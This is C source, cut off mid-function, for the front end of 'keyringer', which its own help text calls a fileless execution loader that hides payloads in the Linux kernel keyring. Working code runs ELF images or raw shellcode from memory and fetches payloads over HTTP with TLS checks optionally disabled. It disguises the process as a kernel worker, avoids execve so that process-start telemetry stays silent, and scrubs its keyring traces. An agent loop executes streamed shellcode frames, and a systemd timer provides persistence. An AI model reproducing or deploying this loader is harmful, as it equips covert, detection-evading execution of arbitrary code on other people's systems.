/*
 * main.c — keyringer CLI.
 *
 * Thin front end over libkeyringer (kr_core.c): argument parsing,
 * text output, usage. All loader diagnostics go to stderr via the
 * kr_set_log() hook; the payload's stdout stays clean. The library
 * itself never prints and never exits — every failure here comes back
 * as -1 + err[] and dies loudly.
 *
 * wire v2.2 additions in this front end:
 *   keygen / keepalive / preflight / agent subcommands,
 *   --selfcontained --clone --type --from --share --keyfd --ctlfd,
 *   khttp --proxy/--header/--insecure.
 */
#define _GNU_SOURCE

#include "keyringer.h"

#include <ctype.h>
#include <errno.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEFAULT_SPOOF "kworker/u8:2"
#define KR_AGENT_MAX_PAYLOAD  (256UL * 1024UL * 1024UL)
#define KR_AGENT_MAX_NAME     4096

extern char **environ;

/* weak libdl refs — see kr_core.c for the static-link rationale */
extern void *dlopen(const char *, int) __attribute__((weak));
extern int dlclose(void *) __attribute__((weak));
extern char *dlerror(void) __attribute__((weak));
#ifndef RTLD_NOW
#define RTLD_NOW 2
#endif

/* ===================================================================== */
/* CLI-side helpers (exit() is allowed here, never in the library)        */
/* ===================================================================== */

static void die(const char *fmt, ...)
    __attribute__((format(printf, 1, 2), noreturn));
static void die(const char *fmt, ...)
{
    va_list ap;

    fputs("keyringer: ", stderr);
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    exit(1);
}

/* library progress hook: everything goes to stderr, like before */
static void kr_log_stderr(const char *fmt, va_list ap)
{
    vfprintf(stderr, fmt, ap);
    fputc('\n', stderr);
}

/* read a whole stream (file or stdin) into a heap buffer */
static uint8_t *read_stream(FILE *f, size_t *out_len)
{
    size_t cap = 65536, len = 0;
    uint8_t *buf = malloc(cap);

    if (!buf)
        die("out of memory");
    for (;;) {
        size_t r;

        if (len == cap) {
            uint8_t *nb;

            cap *= 2;
            nb = realloc(buf, cap);
            if (!nb)
                die("out of memory");
            buf = nb;
        }
        r = fread(buf + len, 1, cap - len, f);
        len += r;
        if (r == 0) {
            if (ferror(f))
                die("read failed: %s", strerror(errno));
            break;
        }
    }
    *out_len = len;
    return buf;
}

static uint8_t *read_file(const char *path, size_t *out_len)
{
    FILE *f = fopen(path, "rb");
    uint8_t *d;

    if (!f)
        die("open %s: %s", path, strerror(errno));
    d = read_stream(f, out_len);
    fclose(f);
    return d;
}

/* ===================================================================== */
/* usage                                                                  */
/* ===================================================================== */

static void usage(FILE *out)
{
    fprintf(out,
        "keyringer — Linux x86-64/AArch64 kernel-keyring fileless exec "
        "loader (%s)\n"
        "\n"
        "usage:\n"
        "  keyringer stash <file|->               store payload in kernel keyring (chunked); prints serials\n"
        "  keyringer kfile <elf> [name] [args...] stash from file, then revoke+load+execute\n"
        "  keyringer kstdin [name] [args...]      stash from stdin, then revoke+load+execute\n"
        "  keyringer khttp <url> [name] [args...] fetch over HTTP(S) (libcurl dlopen'd at runtime),\n"
        "                                         then stash, revoke+load+execute\n"
        "  keyringer exec [name] [args...]        load previously-stashed keys, revoke, execute\n"
        "  keyringer agent [--ctlfd N] [...]      KAG1-frame control loop: stash+clone-exec per frame\n"
        "  keyringer keygen                       print a fresh 64-hex-char key to stdout\n"
        "  keyringer keepalive [opts]             refresh the persistent keyring expiry in a loop\n"
        "  keyringer preflight [--json]           environment checks (W^X, seccomp, LSMs, keyring, ...)\n"
        "  keyringer list [--desc P] [--json]     list <P>.* keys visible to this user (parse /proc/keys)\n"
        "  keyringer gc [--desc P]                DESTROY every visible <P>.* key (stashes, stale\n"
        "                                         chunks, revoked ghosts) via KEYCTL_INVALIDATE\n"
        "  keyringer selftest                     crypto + integrity self-test (RFC 8439 AEAD vector,\n"
        "                                         SHA-256 KAT, wire-v2 stash roundtrip + tamper check)\n"
        "  keyringer help                         show this help\n"
        "\n"
        "flags (may appear anywhere after the subcommand):\n"
        "  --desc PREFIX   key name prefix (default \"%s\", env KEYRINGER_DESC)\n"
        "  --key HEX       64 hex chars; seal the payload with ChaCha20-Poly1305 (RFC 8439)\n"
        "                  before stashing (env KEYRINGER_KEY); exec needs the same key\n"
        "  --keyfd N       read the key from inherited fd N until EOF: raw 32 bytes or 64 hex\n"
        "                  chars. --key > --keyfd > env; --key/env leak via ps and\n"
        "                  /proc/<pid>/environ, --keyfd does not\n"
        "  --persistent    stash into the per-UID persistent keyring (expires after\n"
        "                  /proc/sys/kernel/keys/persistent_keyring_expiry without access)\n"
        "  --raw           payload is raw shellcode, not an ELF (kfile/kstdin/khttp/exec)\n"
        "  --call SYM      load+relocate a self-contained shared object and call its exported\n"
        "                  SYM(int argc, char **argv, char **envp) instead of jumping the ELF\n"
        "                  entry; only RELATIVE/64/GLOB_DAT relocations against locally defined\n"
        "                  symbols are applied — build with -nostdlib -shared -fPIC and no\n"
        "                  undefined symbols (kfile/kstdin/khttp/exec; x86-64 builds only)\n"
        "  --selfcontained stash the payload ELF's PT_INTERP interpreter alongside the payload\n"
        "                  (chunks <prefix>.ldso.NNN, always plaintext — a public artifact has\n"
        "                  no signature value; digest still verified); exec reassembles and maps\n"
        "                  the interpreter from those keys instead of reading it from disk\n"
        "  --type big_key  stash with \"big_key\" keys and 100000-byte wire chunks (default:\n"
        "                  \"user\"/30000); exec lookups try user first, then big_key, per chunk.\n"
        "                  big_key may spill to swap-backed shmem; root-only in practice (quota\n"
        "                  still binds non-root at ~19.76 KB)\n"
        "  --from S1,S2,.. exec: read chunk i directly from the i-th serial (KEYCTL_READ, no\n"
        "                  request_key); revoke is best-effort (EPERM/EACCES nonfatal)\n"
        "  --share         after stash, KEYCTL_SETPERM(0x3f3f0000) every stored key and print\n"
        "  --ttl SECONDS  stash: kernel expires every stored key after SECONDS (crash-safe:\n"
        "                  the keyring GC collects the stash even if the stasher dies)\n"
        "  --scrub        exec: destroy each chunk with KEYCTL_INVALIDATE right after its read\n"
        "                  instead of revoking — dead immediately and swept at the next keyring\n"
        "                  GC (vs an R-flag ghost that lingers); nothing is replayable\n"
        "  --json         machine-readable output for `list` and `preflight`\n"
        "  --keep-ring    kfile/kstdin: stay on the inherited session keyring (the fresh\n"
        "                  ring they join by default is what makes stash ghosts die at exit)\n"
        "                  \"share: <s1>,<s2>,...\" on stdout (parseable by --from)\n"
        "  --clone         stage the image, then clone() a child that runs the payload on a\n"
        "                  fresh stack; parent waitpid()s and exits with the payload's status\n"
        "                  (no execve — process-start telemetry never fires)\n"
        "  --ctlfd N       agent: read KAG1 control frames from fd N (default 0). Payloads\n"
        "                  inherit the process fds — frameworks wanting clean payload stdin\n"
        "                  should pass a dedicated ctl fd and use real stdin for payloads\n"
        "  --proxy URL     khttp: CURLOPT_PROXY\n"
        "  --header STR    khttp: extra request header, repeatable (curl_slist)\n"
        "  --insecure      khttp: disable TLS peer/host verification\n"
        "keepalive options: --desc P, --interval S (default 3600), --times N (default: forever),\n"
        "  --unit (print a systemd USER service+timer pair for manual install instead of looping)\n"
        "\n"
        "default spoof name when [name] is omitted: " DEFAULT_SPOOF "\n",
        kr_version(), KR_DEFAULT_DESC);
}

/* ===================================================================== */
/* list                                                                   */
/* ===================================================================== */

/* minimal JSON string escaping for key descriptions we print */
static void json_escape(const char *s, char *out, size_t outsz)
{
    size_t o = 0;

    for (; *s && o + 7 < outsz; s++) {
        unsigned char ch = (unsigned char)*s;

        if (ch == '"' || ch == '\\') {
            out[o++] = '\\';
            out[o++] = (char)ch;
        } else if (ch < 0x20) {
            o += (size_t)snprintf(out + o, outsz - o, "\\u%04x", ch);
        } else {
            out[o++] = (char)ch;
        }
    }
    out[o] = '\0';
}

static int cmd_list(const char *prefix, int json)
{
    char pfx[128];

    snprintf(pfx, sizeof pfx, "%s.", prefix);

    FILE *f = fopen("/proc/keys", "r");

    if (!f) {
        fprintf(stderr, "keyringer: cannot open /proc/keys: %s\n",
                strerror(errno));
        return 1;
    }

    char line[1024];
    int found = 0;

    if (json)
        printf("[\n");
    while (fgets(line, sizeof line, f)) {
        char serial[32], flags[32], quota[32], usage_[32];
        char perms[32], uid[32], gid[32], type[32];
        int off = 0;

        if (sscanf(line, "%31s %31s %31s %31s %31s %31s %31s %31s %n",
                   serial, flags, quota, usage_, perms, uid, gid, type,
                   &off) != 8)
            continue;
        char *desc = line + off;

        while (*desc == ' ' || *desc == '\t')
            desc++;
        size_t dl = strlen(desc);

        while (dl && (desc[dl - 1] == '\n' || desc[dl - 1] == '\r'))
            desc[--dl] = '\0';
        if (strcmp(type, "user") != 0 && strcmp(type, "big_key") != 0)
            continue;
        if (strncmp(desc, pfx, strlen(pfx)) != 0)
            continue;
        /* flags[1] == 'R' marks a revoked key; such keys still linger in
         * /proc/keys until the kernel GC unlinks them but cannot be read */
        int revoked = strlen(flags) > 1 && flags[1] == 'R';

        if (json) {
            char esc[1024];

            json_escape(desc, esc, sizeof esc);
            printf("%s{\"serial\":\"%s\",\"type\":\"%s\","
                   "\"desc\":\"%s\",\"revoked\":%s}",
                   found ? "," : "", serial, type, esc,
                   revoked ? "true" : "false");
        } else if (revoked) {
            printf("%s  %s (revoked)\n", serial, desc);
        } else {
            printf("%s  %s\n", serial, desc);
        }
        found++;
    }
    fclose(f);
    if (json)
        printf("]\n");
    else if (!found)
        printf("no %s* keys visible in /proc/keys\n", pfx);
    return 0;
}

/* ===================================================================== */
/* option parsing                                                         */
/* ===================================================================== */

struct cli {
    const char  *desc;         /* NULL => default/env */
    const char  *key;          /* NULL => plaintext   */
    int          persistent;
    int          raw;
    const char  *call;
    /* wire v2.2 */
    int          selfcontained;
    int          clone;
    const char  *key_type;
    const char  *from;
    int          share;
    int          keyfd;        /* -1 => not given */
    const char  *proxy;
    char       **headers;      /* NULL-terminated, for khttp --header */
    int          nheaders;
    int          insecure;
    int          ctlfd;        /* agent, default 0 */
    long         ttl;          /* --ttl SECONDS, 0 => none */
    int          scrub;        /* --scrub */
    int          json;         /* --json (list, preflight) */
    int          keep_ring;    /* --keep-ring: stay on the inherited ring  */
    const char  *pos[2];       /* positional 0 and 1  */
    int          npos;
    char       **args;         /* payload args        */
    int          nargs;
};

/*
 * Join a fresh anonymous session keyring: stash keys of a one-shot run
 * (kfile/kstdin) are linked ONLY into a ring that dies with this process,
 * so even revoked ghosts disappear at exit instead of lingering until the
 * inherited shell ring dies.  Skipped for --share/--from (serial handoff
 * needs keys that outlive us) and --keep-ring (explicit opt-out).
 */
#ifndef KEYCTL_JOIN_SESSION_KEYRING
#define KEYCTL_JOIN_SESSION_KEYRING 1
#endif
static void join_fresh_ring(const struct cli *c)
{
    if (c->share || c->from || c->keep_ring)
        return;
    long rc = syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, 0, 0, 0);

    if (rc >= 0)   /* success returns the new ring's serial */
        fprintf(stderr, "stash: fresh session keyring joined — stash "
                "residue dies with this process\n");
}

/* encode 32 raw bytes as 64 lowercase hex chars + NUL (CLI-side copy) */
static void cli_hex32(const uint8_t *d, char out[KR_KEY_HEX_LEN + 1])
{
    static const char hexd[] = "0123456789abcdef";

    for (int i = 0; i < 32; i++) {
        out[i * 2] = hexd[d[i] >> 4];
        out[i * 2 + 1] = hexd[d[i] & 0x0f];
    }
    out[KR_KEY_HEX_LEN] = '\0';
}

/*
 * Read a key material fd until EOF (--keyfd N). Accepts raw 32 bytes or
 * 64 hex chars; surrounding whitespace/CR/LF is trimmed. Rationale:
 * --key HEX and $KEYRINGER_KEY leak through `ps` output and
 * /proc/<pid>/environ; an inherited fd shows up as neither.
 */
static char *read_keyfd(int fd)
{
    size_t cap = 256, len = 0;
    uint8_t *buf = malloc(cap);

    if (!buf)
        die("out of memory");
    for (;;) {
        ssize_t r;

        if (len == cap) {
            uint8_t *nb;

            cap *= 2;
            nb = realloc(buf, cap);
            if (!nb)
                die("out of memory");
            buf = nb;
        }
        r = read(fd, buf + len, cap - len);
        if (r < 0) {
            if (errno == EINTR)
                continue;
            die("read key from fd %d: %s", fd, strerror(errno));
        }
        if (r == 0)
            break;
        len += (size_t)r;
        if (len > 4096)
            die("key on fd %d unreasonably long", fd);
    }
    while (len && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
                   buf[len - 1] == ' '  || buf[len - 1] == '\t'))
        len--;
    if (len == 32) {
        char hex[KR_KEY_HEX_LEN + 1];

        cli_hex32(buf, hex);
        free(buf);
        return strdup(hex);
    }
    if (len == KR_KEY_HEX_LEN) {
        int ishex = 1;

        for (size_t i = 0; i < len; i++) {
            if (!isxdigit(buf[i])) {
                ishex = 0;
                break;
            }
        }
        if (ishex) {
            char *h = malloc(len + 1);

            memcpy(h, buf, len);
            h[len] = '\0';
            free(buf);
            return h;
        }
    }
    die("key on fd %d must be raw 32 bytes or 64 hex chars (got %zu bytes)",
        fd, len);
}

static void cli_parse(int argc, char **argv, int start, struct cli *c)
{
    memset(c, 0, sizeof *c);
    c->keyfd = -1;
    c->ctlfd = 0;
    c->args = malloc((size_t)(argc > 0 ? argc : 1) * sizeof(char *));
    c->headers = malloc((size_t)(argc > 0 ? argc + 1 : 1) * sizeof(char *));
    if (!c->args || !c->headers)
        die("out of memory");
    c->headers[0] = NULL;

    for (int i = start; i < argc; i++) {
        const char *a = argv[i];

        if (strcmp(a, "--desc") == 0) {
            if (++i >= argc)
                die("--desc requires a value");
            c->desc = argv[i];
        } else if (strcmp(a, "--key") == 0) {
            if (++i >= argc)
                die("--key requires a value");
            c->key = argv[i];
        } else if (strcmp(a, "--keyfd") == 0) {
            if (++i >= argc)
                die("--keyfd requires a value");
            c->keyfd = atoi(argv[i]);
            if (c->keyfd < 0)
                die("--keyfd requires a non-negative fd");
        } else if (strcmp(a, "--persistent") == 0) {
            c->persistent = 1;
        } else if (strcmp(a, "--raw") == 0) {
            c->raw = 1;
        } else if (strcmp(a, "--call") == 0) {
            if (++i >= argc)
                die("--call requires a value");
            c->call = argv[i];
        } else if (strcmp(a, "--selfcontained") == 0) {
            c->selfcontained = 1;
        } else if (strcmp(a, "--clone") == 0) {
            c->clone = 1;
        } else if (strcmp(a, "--type") == 0) {
            if (++i >= argc)
                die("--type requires a value");
            if (strcmp(argv[i], "user") != 0 &&
                strcmp(argv[i], "big_key") != 0)
                die("--type must be \"user\" or \"big_key\"");
            c->key_type = argv[i];
        } else if (strcmp(a, "--from") == 0) {
            if (++i >= argc)
                die("--from requires a value");
            c->from = argv[i];
        } else if (strcmp(a, "--share") == 0) {
            c->share = 1;
        } else if (strcmp(a, "--proxy") == 0) {
            if (++i >= argc)
                die("--proxy requires a value");
            c->proxy = argv[i];
        } else if (strcmp(a, "--header") == 0) {
            if (++i >= argc)
                die("--header requires a value");
            c->headers[c->nheaders++] = argv[i];
            c->headers[c->nheaders] = NULL;
        } else if (strcmp(a, "--insecure") == 0) {
            c->insecure = 1;
        } else if (strcmp(a, "--ttl") == 0) {
            char *end = NULL;

            if (++i >= argc)
                die("--ttl requires a value");
            c->ttl = strtol(argv[i], &end, 10);
            if (end == argv[i] || *end != '\0' || c->ttl <= 0)
                die("--ttl requires a positive number of seconds");
        } else if (strcmp(a, "--scrub") == 0) {
            c->scrub = 1;
        } else if (strcmp(a, "--json") == 0) {
            c->json = 1;
        } else if (strcmp(a, "--keep-ring") == 0) {
            c->keep_ring = 1;
        } else if (strcmp(a, "--ctlfd") == 0) {
            if (++i >= argc)
                die("--ctlfd requires a value");
            c->ctlfd = atoi(argv[i]);
            if (c->ctlfd < 0)
                die("--ctlfd requires a non-negative fd");
        } else if (strncmp(a, "--", 2) == 0 && a[2] != '\0') {
            fprintf(stderr, "keyringer: unknown flag '%s'\n", a);
            usage(stderr);
            exit(1);
        } else if (c->npos < 2) {
            c->pos[c->npos++] = a;
        } else {
            c->args[c->nargs++] = argv[i];
        }
    }

    if (!c->desc) {
        const char *e = getenv("KEYRINGER_DESC");

        c->desc = e && *e ? e : NULL;
    }
    if (!c->key) {
        const char *e = getenv("KEYRINGER_KEY");

        c->key = e && *e ? e : NULL;
    }
    /*
     * Key material precedence: --key > --keyfd > $KEYRINGER_KEY (the env
     * fallback above runs first; an explicit --keyfd must still beat
     * the environment).
     */
    if (!c->key && c->keyfd >= 0)
        c->key = read_keyfd(c->keyfd);
    if (c->raw && c->call)
        die("--raw and --call are mutually exclusive");
    if (c->clone && c->call)
        die("--clone and --call are mutually exclusive");
}

static void build_opts(const struct cli *c, kr_opts *o)
{
    memset(o, 0, sizeof *o);
    o->desc_prefix = c->desc;
    o->key_hex = c->key;
    o->persistent = c->persistent;
    o->raw = c->raw;
    o->call_symbol = c->call;
    o->selfcontained = c->selfcontained;
    o->clone_child = c->clone;
    o->key_type = c->key_type;
    o->from_serials = c->from;
    o->share = c->share;
    o->ttl = c->ttl;
    o->scrub = c->scrub;
}

/* stash and, when --share was given, print the parseable serial line */
static void stash_and_share(const struct cli *c, const kr_opts *o,
                            const uint8_t *payload, size_t plen)
{
    char err[KR_ERRSZ];
    long *serials = NULL;
    size_t nserials = 0;
    kr_opts o2 = *o;

    if (c->share) {
        serials = malloc(sizeof(long) * 1100);
        if (!serials)
            die("out of memory");
        o2.serials_out = serials;
        o2.serials_out_cap = 1100;
        o2.serials_out_n = &nserials;
    }
    if (kr_stash(payload, plen, &o2, err) != 0)
        die("%s", err);
    if (c->share && nserials) {
        printf("share: ");
        for (size_t i = 0; i < nserials; i++)
            printf("%s%ld", i ? "," : "", serials[i]);
        printf("\n");
        fflush(stdout);
    }
    free(serials);
}

/*
 * The common kfile/kstdin/khttp/exec flow: optional stash, then
 * revoke+load, then either --call (returns), --clone (returns the
 * payload's exit status) or the fileless exec jump (never returns).
 */
static int run_payload(const struct cli *c, const char *spoof,
                       const uint8_t *payload, size_t plen)
{
    kr_opts o;
    char err[KR_ERRSZ];

    build_opts(c, &o);
    if (payload)
        stash_and_share(c, &o, payload, plen);
    free((void *)payload);

    fflush(NULL);   /* the payload inherits these streams; flush now */

    void *img;
    size_t ilen;

    if (kr_load_revoke(&o, &img, &ilen, err) != 0)
        die("%s", err);

    /* argv for the payload: [spoof, args...] */
    size_t total = 1 + (size_t)c->nargs;
    char **pargv = malloc((total + 1) * sizeof(char *));

    if (!pargv)
        die("out of memory");
    pargv[0] = (char *)spoof;
    for (int i = 0; i < c->nargs; i++)
        pargv[1 + i] = c->args[i];
    pargv[total] = NULL;

    if (o.call_symbol) {
        long retval = 0;

        if (kr_call_symbol(img, ilen, &o, (int)total, pargv, environ,
                           &retval, err) != 0)
            die("%s", err);
        return (int)(retval & 0xff);
    }

    int rc = kr_exec_image(img, ilen, &o, (int)total, pargv, environ, err);

    if (rc >= 0)
        return rc;      /* --clone: payload's exit status */
    die("%s", err);
}

/* ===================================================================== */
/* agent: KAG1 control-frame loop                                         */
/* ===================================================================== */

static int read_full(int fd, void *buf, size_t n)
{
    uint8_t *p = buf;

    while (n) {
        ssize_t r = read(fd, p, n);

        if (r < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (r == 0)
            return -1;         /* EOF mid-frame */
        p += r;
        n -= (size_t)r;
    }
    return 0;
}

/*
 * Read one KAG1 frame from fd:
 *   u32 LE magic 0x3147414B ("KAG1" little-endian), u32 LE len,
 *   len payload bytes, u16 LE name_len, name bytes.
 * A zero-length frame ends the stream cleanly (returns 0 with
 * *payload == NULL). Returns -1 on protocol errors (message printed),
 * 1 on success.
 */
static int read_agent_frame(int fd, uint8_t **payload, size_t *plen,
                            char **name)
{
    uint8_t hdr[8];
    int r = read_full(fd, hdr, sizeof hdr);

    if (r != 0) {
        *payload = NULL;
        return 0;              /* clean EOF before a frame */
    }
    uint32_t magic = (uint32_t)hdr[0] | ((uint32_t)hdr[1] << 8) |
                     ((uint32_t)hdr[2] << 16) | ((uint32_t)hdr[3] << 24);
    uint32_t len = (uint32_t)hdr[4] | ((uint32_t)hdr[5] << 8) |
                   ((uint32_t)hdr[6] << 16) | ((uint32_t)hdr[7] << 24);

    if (magic != KR_AGENT_MAGIC) {
        fprintf(stderr, "keyringer: agent: bad frame magic 0x%08x\n", magic);
        return -1;
    }
    if (len == 0) {
        *payload = NULL;       /* terminator frame */
        return 0;
    }
    if (len > KR_AGENT_MAX_PAYLOAD) {
        fprintf(stderr, "keyringer: agent: frame too long (%u)\n", len);
        return -1;
    }
    uint8_t *pl = malloc(len);

    if (!pl)
        die("out of memory");
    if (read_full(fd, pl, len) != 0) {
        fprintf(stderr, "keyringer: agent: short frame payload\n");
        free(pl);
        return -1;
    }
    uint8_t nb[2];

    if (read_full(fd, nb, sizeof nb) != 0) {
        fprintf(stderr, "keyringer: agent: short frame name length\n");
        free(pl);
        return -1;
    }
    size_t nlen = (size_t)nb[0] | ((size_t)nb[1] << 8);

    if (nlen > KR_AGENT_MAX_NAME) {
        fprintf(stderr, "keyringer: agent: name too long (%zu)\n", nlen);
        free(pl);
        return -1;
    }
    char *nm = malloc(nlen + 1);

    if (!nm)
        die("out of memory");
    if (nlen && read_full(fd, nm, nlen) != 0) {
        fprintf(stderr, "keyringer: agent: short frame name\n");
        free(pl);
        free(nm);
        return -1;
    }
    nm[nlen] = '\0';
    *payload = pl;
    *plen = len;
    *name = nm;
    return 1;
}

/*
 * agent mode: one stash + clone-exec per frame. The child inherits the
 * process fds, so a payload reading stdin would eat the control stream
 * — documented practice: give the agent a dedicated --ctlfd and keep
 * real stdin for payloads. Per-frame payload format is auto-detected:
 * "\x7fELF" images run as ELFs, anything else as raw shellcode (a
 * global --raw forces raw for every frame).
 */
static int cmd_agent(struct cli *c)
{
    kr_opts o;
    char err[KR_ERRSZ];
    int frames = 0;

    build_opts(c, &o);
    for (;;) {
        uint8_t *payload = NULL;
        size_t plen = 0;
        char *name = NULL;
        int r = read_agent_frame(c->ctlfd, &payload, &plen, &name);

        if (r < 0)
            return 1;
        if (r == 0)
            break;             /* terminator frame or EOF: done */

        long child_pid = 0;
        int exit_code;

        kr_opts fo = o;
        fo.raw = o.raw || memcmp(payload, "\x7f" "ELF", 4) != 0;
        fo.clone_child = 1;
        fo.child_pid_out = &child_pid;

        const char *spoof = name[0] ? name : DEFAULT_SPOOF;
        size_t total = 1 + (size_t)c->nargs;
        char **pargv = malloc((total + 1) * sizeof(char *));

        if (!pargv)
            die("out of memory");
        pargv[0] = (char *)spoof;
        for (int i = 0; i < c->nargs; i++)
            pargv[1 + i] = c->args[i];
        pargv[total] = NULL;

        fflush(NULL);
        if (kr_stash(payload, plen, &fo, err) != 0) {
            fprintf(stderr, "keyringer: agent: stash failed: %s\n", err);
            exit_code = 125;
            goto report;
        }
        void *img;
        size_t ilen;

        if (kr_load_revoke(&fo, &img, &ilen, err) != 0) {
            fprintf(stderr, "keyringer: agent: load failed: %s\n", err);
            exit_code = 125;
            goto report;
        }
        int rc = kr_exec_image(img, ilen, &fo, (int)total, pargv, environ,
                               err);

        if (rc >= 0) {
            exit_code = rc;
        } else {
            fprintf(stderr, "keyringer: agent: exec failed: %s\n", err);
            exit_code = 125;
        }
report:
        printf("agent: ran %s pid=%ld exit=%d\n", name, child_pid,
               exit_code);
        fflush(stdout);
        free(payload);
        free(name);
        free(pargv);
        frames++;
    }
    fprintf(stderr, "agent: %d frame(s) executed, control stream ended\n",
            frames);
    return 0;
}

/* ===================================================================== */
/* keepalive                                                              */
/* ===================================================================== */

/* absolute path of this binary, "%h/..."-ified when it lives under $HOME */
static void self_path_percent_h(char *out, size_t outsz)
{
    char buf[4096];
    ssize_t n = readlink("/proc/self/exe", buf, sizeof buf - 1);
    const char *home = getenv("HOME");

    if (n <= 0) {
        snprintf(out, outsz, "keyringer");
        return;
    }
    buf[n] = '\0';
    if (home && *home && strncmp(buf, home, strlen(home)) == 0 &&
        (buf[strlen(home)] == '/' || buf[strlen(home)] == '\0'))
        snprintf(out, outsz, "%%h%s", buf + strlen(home));
    else
        snprintf(out, outsz, "%s", buf);
}

static int cmd_keepalive_opts(const kr_opts *o, long interval, long times,
                              int unit)
{
    char self[4096];

    if (unit) {
        self_path_percent_h(self, sizeof self);
        printf(
            "# keyringer keepalive — systemd USER units for manual install:\n"
            "#   ~/.config/systemd/user/keyringer-keepalive.service\n"
            "#   ~/.config/systemd/user/keyringer-keepalive.timer\n"
            "# then: systemctl --user daemon-reload && \\\n"
            "#       systemctl --user enable --now keyringer-keepalive.timer\n"
            "\n"
            "# ~/.config/systemd/user/keyringer-keepalive.service\n"
            "[Unit]\n"
            "Description=keyringer persistent-keyring keepalive\n"
            "\n"
            "[Service]\n"
            "Type=oneshot\n"
            "ExecStart=%s keepalive --interval %ld\n"
            "\n"
            "# ~/.config/systemd/user/keyringer-keepalive.timer\n"
            "[Unit]\n"
            "Description=keyringer persistent-keyring keepalive timer\n"
            "\n"
            "[Timer]\n"
            "OnUnitActiveSec=%ld\n"
            "Unit=keyringer-keepalive.service\n"
            "\n"
            "[Install]\n"
            "WantedBy=timers.target\n",
            self, interval, interval);
        return 0;
    }

    char err[KR_ERRSZ];

    for (long t = 0; times <= 0 || t < times; t++) {
        long s = kr_keepalive_beat(o, err);

        if (s > 0)
            printf("keepalive: ring alive, chunk000 serial %ld\n", s);
        else if (s == 0)
            printf("keepalive: ring alive, chunk000 serial absent\n");
        else
            fprintf(stderr, "keyringer: keepalive: %s\n", err);
        fflush(stdout);
        if (times <= 0 || t + 1 < times)
            sleep((unsigned int)interval);
    }
    return 0;
}

/* ===================================================================== */
/* preflight                                                              */
/* ===================================================================== */

/* read one "Key:\tValue" line from /proc/self/status */
static long status_long(const char *key, int *found)
{
    FILE *f = fopen("/proc/self/status", "r");
    long val = 0;

    if (found)
        *found = 0;
    if (!f)
        return 0;
    char line[512];

    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, key, strlen(key)) == 0 && line[strlen(key)] == ':') {
            val = strtol(line + strlen(key) + 1, NULL, 10);
            if (found)
                *found = 1;
            break;
        }
    }
    fclose(f);
    return val;
}

/* read a whole small file as a string (trailing newline trimmed) */
static int small_file(const char *path, char *out, size_t outsz)
{
    FILE *f = fopen(path, "r");

    out[0] = '\0';
    if (!f)
        return -1;
    if (!fgets(out, (int)outsz, f)) {
        fclose(f);
        return -1;
    }
    fclose(f);
    size_t l = strlen(out);

    while (l && (out[l - 1] == '\n' || out[l - 1] == '\r'))
        out[--l] = '\0';
    return 0;
}

/*
 * CRITICAL W^X self-test: an anonymous RW page is written (one `ret`),
 * mprotect'ed PROT_EXEC and called through a function pointer. A kernel
 * that refuses (mprotect EPERM/EACCES, or the x bit never appears in
 * /proc/self/maps) makes the staging flow fail -> CRITICAL failure.
 * The page is only executed once the maps check confirms x, so a
 * hardened environment cannot crash the preflight either.
 */
static int wx_test(void)
{
    size_t ps = 4096;
    long v = sysconf(_SC_PAGESIZE);

    if (v > 0)
        ps = (size_t)v;
    void *region = mmap(NULL, ps, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (region == MAP_FAILED)
        return -1;
#ifdef __aarch64__
    /* arm64 `ret`: d65f03c0 (mov x30 into pc; 0xC3 is the x86 encoding) */
    uint32_t ret64 = 0xd65f03c0u;

    memcpy(region, &ret64, sizeof ret64);
#else
    ((uint8_t *)region)[0] = 0xC3;      /* `ret` */
#endif

    if (mprotect(region, ps, PROT_READ | PROT_EXEC) == -1) {
        int e = errno;

        munmap(region, ps);
        fprintf(stderr, "preflight: mprotect RW->RX denied: %s\n",
                strerror(e));
        return -1;
    }

    /* confirm the x bit actually landed before calling through it */
    int executable = 0;
    FILE *f = fopen("/proc/self/maps", "r");

    if (f) {
        char line[512];
        uintptr_t lo = (uintptr_t)region, hi = lo + ps;

        while (fgets(line, sizeof line, f)) {
            uintptr_t a = 0, b = 0;
            char perms[8] = { 0 };

            if (sscanf(line, "%lx-%lx %7s", &a, &b, perms) == 3 &&
                lo >= a && hi <= b) {
                executable = strchr(perms, 'x') != NULL;
                break;
            }
        }
        fclose(f);
    }
    if (!executable) {
        munmap(region, ps);
        fprintf(stderr, "preflight: PROT_EXEC silently dropped (W^X)\n");
        return -1;
    }

    ((void (*)(void))region)();         /* the actual W^X probe call */
    munmap(region, ps);
    return 0;
}

/* one preflight check: classic "preflight: name: detail: STATUS" line, or
 * a JSON object element when --json (array brackets printed by the caller) */
static int PF_JSON;              /* set by cmd_preflight */
static int PF_FIRST;             /* comma bookkeeping    */

static void pf(const char *name, int critical, const char *status,
               const char *fmt, ...)
{
    char detail[512];
    va_list ap;

    va_start(ap, fmt);
    vsnprintf(detail, sizeof detail, fmt, ap);
    va_end(ap);

    if (!PF_JSON) {
        printf("preflight: %s: %s: %s%s\n", name, detail, status,
               critical ? " [CRITICAL]" : "");
        return;
    }
    char esc[768];

    json_escape(detail, esc, sizeof esc);
    printf("%s{\"name\":\"%s\",\"status\":\"%s\",\"critical\":%s,"
           "\"detail\":\"%s\"}",
           PF_FIRST ? "" : ",", name, status,
           critical ? "true" : "false", esc);
    PF_FIRST = 0;
}

static int cmd_preflight(int json)
{
    int critical_fail = 0;
    char buf[1024];

    PF_JSON = json;
    PF_FIRST = 1;
    if (json)
        printf("[\n");

    /* (a) seccomp — CRITICAL: a filter can silently break keyctl/clone */
    {
        int f1 = 0, f2 = 0;
        long seccomp = status_long("Seccomp", &f1);
        long filters = status_long("Seccomp_filters", &f2);

        if (!f1)
            seccomp = 0;
        if (!f2)
            filters = 0;
        if (seccomp != 0 || filters > 0)
            critical_fail = 1;
        pf("seccomp", 1, (seccomp != 0 || filters > 0) ? "FAIL" : "PASS",
           "Seccomp=%ld Seccomp_filters=%ld", seccomp, filters);
    }

    /* (b) SELinux — tolerated when absent */
    {
        char ctx[256] = { 0 };
        int enforce = -1;

